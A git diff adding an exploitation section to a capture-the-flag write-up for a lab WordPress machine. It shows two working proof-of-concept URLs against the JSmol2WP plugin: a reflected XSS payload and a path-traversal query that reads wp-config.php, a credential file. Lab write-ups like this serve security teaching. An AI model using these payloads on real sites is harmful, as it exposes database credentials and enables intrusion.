@@ -134,3 +134,29 @@ We can see that **wp-content/uploads** its accessible from our so we go on the p
 ![Uploads](./screenshots/recon5.png)
 
 We can see the version of WordPress that it's running on the server is **6.7.1** which is outdated, but considering the hints that we got at the description of the challenge the intended way of approaching this machine is looking at the **publicly known vulnerable plugin** so we'll search for that. We find an article stating that JSmol2WP <= 1.7 which is the version we're running is vulnerable to LFI and XSS so we'll start our exploiting phase based on that.
+
+---
+
+## Exploit
+
+I found a Git repository (https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt) refferenced in Pentest-Tools' article about the CVE (https://pentest-tools.com/vulnerabilities-exploits/wordpress-jsmol2wp-107-local-file-inclusion_2654), and it explains along with PoCs how to exploit the vulnerability found in that plugin. I firstly tested the **XSS** in the URL to see if it reflects and if the exploit is actually working:
+
+```
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
+```
+
+Which got me this response:
+
+![PoC XSS](./screenshots/exploit1.png)
+
+**We have a hit!**
+
+Next we will use **directory traversal** to look through the folders on the server.
+
+```
+http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
+```
+
+And we got this:
+
+![PoC wp-config](./screenshots/exploit2.png)
